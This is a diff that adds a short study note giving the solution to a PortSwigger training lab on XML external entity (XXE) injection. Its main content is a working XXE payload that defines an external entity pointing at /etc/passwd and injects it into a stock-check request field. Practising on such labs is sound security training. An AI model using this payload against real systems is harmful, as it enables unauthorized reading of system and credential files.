@@ -1,0 +1,14 @@
+[lab: Exploiting XXE using external entities to retrieve files]
+url: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files
+solution: solution should be somewhat similar to the following:
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+    <stockCheck>
+        <storeId>
+           9
+        </storeId>
+        <productId>
+           &xxe;
+        </productId>
+    </stockCheck>
+
